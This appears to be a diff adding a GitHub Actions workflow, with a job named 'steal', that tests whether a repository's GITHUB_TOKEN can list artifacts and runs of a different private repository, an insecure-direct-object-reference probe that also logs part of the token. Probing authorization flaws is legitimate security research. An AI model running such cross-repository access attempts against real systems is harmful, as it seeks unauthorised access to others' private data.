@@ -1,0 +1,27 @@
+name: artifact-cross-repo-idor
+on: workflow_dispatch
+permissions:
+  contents: read
+  actions: read
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Try download artifact from OTHER private repo with this repo GITHUB_TOKEN
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -euo pipefail
+          echo "Token prefix: ${GH_TOKEN:0:4} len=${#GH_TOKEN}"
+          # List artifacts on private repo
+          code=$(curl -sS -o /tmp/arts.json -w "%{http_code}" \
+            -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/sujit-jaunjal/app-authz-private/actions/artifacts")
+          echo "list private artifacts HTTP $code"
+          head -c 500 /tmp/arts.json; echo
+          # Also try known run if any
+          code2=$(curl -sS -o /tmp/runs.json -w "%{http_code}" \
+            -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/sujit-jaunjal/app-authz-private/actions/runs?per_page=5")
+          echo "list private runs HTTP $code2"
+          head -c 400 /tmp/runs.json; echo
